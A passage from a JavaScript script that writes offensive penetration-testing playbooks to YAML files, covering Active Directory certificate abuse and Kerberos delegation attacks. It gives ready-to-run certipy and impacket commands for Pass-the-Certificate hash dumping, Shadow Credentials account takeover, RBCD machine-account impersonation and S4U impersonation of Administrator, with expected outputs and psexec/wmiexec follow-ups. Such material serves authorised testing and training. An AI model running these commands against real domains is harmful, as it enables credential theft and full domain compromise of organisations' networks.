        id: 'adcs-pass-the-certificate',
        title: 'Pass-the-Certificate & NTLM Hash Extraction',
        phase: 'exploitation',
        purpose: 'Authenticate against the Domain Controller using the `.pfx` certificate to retrieve the Administrator TGT and plaintext NTLM hash.',
        command: "certipy auth -pfx administrator.pfx -dc-ip {{TARGET}}",
        expected_output: ['[*] Got TGT for `administrator@corp.local`', '[*] Got NTLM hash: administrator:500:aad3b4...:31d6cfe0d16ae931b73c59d7e0c089c0:::'],
        common_mistakes: ['Sync your clock with the DC if Kerberos rejects timestamp.'],
        if_success: 'Domain Administrator NTLM hash dumped! Full domain compromise.',
        if_failure: 'PKINIT not supported on DC. Use certificate with Schannel LDAP binding.',
        references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/']
      },
      {
        id: 'adcs-shadow-credentials',
        title: 'Shadow Credentials Attack (msDS-KeyCredentialLink)',
        phase: 'exploitation',
        purpose: 'If you have GenericWrite/WriteProperty on a user or computer account, write shadow credentials to take over the account without changing its password.',
        command: "certipy shadow auto -u '{{USERNAME}}@{{DOMAIN|corp.local}}' -p '{{PASSWORD}}' -account '{{TARGET_ACCOUNT|DC$}}' -dc-ip {{TARGET}}",
        expected_output: ['[*] Generating certificate...', '[*] Successfully updated `msDS-KeyCredentialLink`', '[*] Got NTLM hash for `DC$`'],
        common_mistakes: ['Requires functional KDC PKINIT support on the Domain Controller.'],
        if_success: 'Shadow credentials injected and target account hash retrieved! Proceed to DCSync.',
        if_failure: 'Write permission missing on target object. Check BloodHound for ACL write paths.',
        references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/']
      }
    ]
  },

  // ==========================================
  // 40. KERBEROS DELEGATIONS & RBCD
  // ==========================================
  {
    id: 'delegation-rbcd',
    name: 'Kerberos Delegation & RBCD Exploitation',
    category: 'ad',
    description: 'Methodology for Kerberos delegation vulnerabilities: Unconstrained Delegation (TGT harvesting), Constrained Delegation (S4U2Self/S4U2Proxy), and Resource-Based Constrained Delegation (RBCD).',
    port_triggers: [88, 389, 445],
    service_triggers: ['kerberos', 'ldap'],
    tags: ['delegation', 'rbcd', 's4u2proxy', 'unconstrained', 'kerberos'],
    steps: [
      {
        id: 'delegation-find-accounts',
        title: 'Enumerate Accounts with Kerberos Delegation',
        phase: 'enumeration',
        purpose: 'Discover computers and service accounts configured with Unconstrained (`TRUSTED_FOR_DELEGATION`) or Constrained delegation.',
        command: "impacket-findDelegation '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{TARGET}}",
        expected_output: ['AccountType: Computer | Name: IIS-SRV$ | Delegation: Unconstrained', 'AccountType: Service  | Name: svc_sql   | Delegation: Constrained (msDS-AllowedToDelegateTo: cifs/DC.corp.local)'],
        common_mistakes: ['Accounts configured for Unconstrained delegation will store incoming user TGTs in LSASS.'],
        if_success: 'Delegation accounts identified! Select appropriate attack vector below.',
        if_failure: 'No classic delegation configured. Test Resource-Based Constrained Delegation (RBCD).',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'delegation-rbcd-attack',
        title: 'Resource-Based Constrained Delegation (RBCD) Takeover',
        phase: 'privesc',
        purpose: 'Create a new machine account and configure `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object to impersonate Local Administrator.',
        command: "impacket-addcomputer '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -computer-name 'ATTACK-PC$' -computer-pass 'CompPass123!' -dc-ip {{TARGET}} && impacket-rbcd '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -delegate-to '{{TARGET_COMPUTER|FILE-SRV$}}' -delegate-from 'ATTACK-PC$' -action write -dc-ip {{TARGET}} && impacket-getST '{{DOMAIN|corp.local}}/ATTACK-PC$:CompPass123!' -spn 'cifs/{{TARGET_COMPUTER|FILE-SRV.corp.local}}' -impersonate Administrator -dc-ip {{TARGET}}",
        expected_output: ['[+] Successfully added machine account ATTACK-PC$', '[+] Delegation rights modified successfully', '[*] Saving ticket in Administrator.ccache'],
        common_mistakes: ['`MachineAccountQuota` in Active Directory must be greater than 0.'],
        if_success: 'Administrator ticket saved to `Administrator.ccache`! Inject ticket: `export KRB5CCNAME=Administrator.ccache && impacket-wmiexec -k -no-pass {{TARGET_COMPUTER}}`.',
        if_failure: 'Write permission missing on target computer object.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'delegation-s4u-impersonate',
        title: 'Constrained Delegation S4U Impersonation (impacket-getST)',
        phase: 'exploitation',
        purpose: 'Abuse Constrained Delegation with Protocol Transition (S4U2Self / S4U2Proxy) to request a service ticket for any user (including Domain Admin).',
        command: "impacket-getST '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -spn 'cifs/{{TARGET}}' -impersonate Administrator -dc-ip {{TARGET}}",
        expected_output: ['[*] Requesting S4U2self ticket...', '[*] Requesting S4U2proxy ticket...', '[*] Saving ticket in Administrator.ccache'],
        common_mistakes: ['Account must have `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` (Protocol Transition) or require forwardable TGT.'],
        if_success: 'Service ticket forged! Use with `export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass {{TARGET}}`.',
        if_failure: 'Account not allowed to delegate to target SPN.',
        references: ['https://wadcoms.github.io/']
      }
    ]
  }
];

const folderMapping = {
  'unknown-service': 'network/unknown-service',
  ftp: 'network/ftp',
  ssh: 'network/ssh',
  smtp: 'network/smtp',
  dns: 'network/dns',
  tftp: 'network/tftp',
  finger: 'network/finger',
  http: 'network/http',
  kerberos: 'network/kerberos',
  'mail-pop3-imap': 'network/mail-pop3-imap',
  nfs: 'network/nfs',
  snmp: 'network/snmp',
  ldap: 'network/ldap',
  ipmi: 'network/ipmi',
  rsync: 'network/rsync',
  smb: 'network/smb',
  mssql: 'network/mssql',
  'oracle-tns': 'network/oracle-tns',
  mysql: 'network/mysql',
  rdp: 'network/rdp',
  winrm: 'network/winrm',
  redis: 'network/redis',
  'file-inclusion': 'web/file-inclusion',
  'sqli-sqlmap': 'web/sqli',
  'file-upload': 'web/file-upload',
  'command-injection': 'web/command-injection',
  xss: 'web/xss',
  xxe: 'web/xxe',
  'common-apps': 'web/common-apps',
  'ad-attacks': 'ad/ad-attacks',
  'ad-domain-trusts-nopac': 'ad/ad-domain-trusts-nopac',
  adcs: 'ad/adcs',
  'delegation-rbcd': 'ad/delegation-rbcd',
  'linux-privesc': 'privesc/linux',
  'windows-privesc': 'privesc/windows',
  'win-priv-groups': 'privesc/win-priv-groups',
  'lolbas-gtfobins': 'privesc/lolbas-gtfobins',
  pivoting: 'pivoting/pivoting',
  'shells-transfer': 'pivoting/shells-transfer',
  'password-cracking': 'passwords/password-cracking',
};

console.log(`Writing ${MASTER_PLAYBOOKS.length} clean, modular Master Playbooks to /knowledge...`);

MASTER_PLAYBOOKS.forEach((playbook) => {
  const relativeFolder = folderMapping[playbook.id] || `other/${playbook.id}`;
  const targetFolder = path.join(KNOWLEDGE_DIR, relativeFolder);

  if (!fs.existsSync(targetFolder)) {
    fs.mkdirSync(targetFolder, { recursive: true });
  }

  const yamlContent = yaml.dump(playbook, { indent: 2, lineWidth: -1 });
  fs.writeFileSync(path.join(targetFolder, 'playbook.yaml'), yamlContent, 'utf8');
  console.log(`✓ Generated clean playbook: [${playbook.id}] -> ${relativeFolder}/playbook.yaml`);
});

console.log(`Successfully generated all ${MASTER_PLAYBOOKS.length} clean, powerhouse playbooks!`);
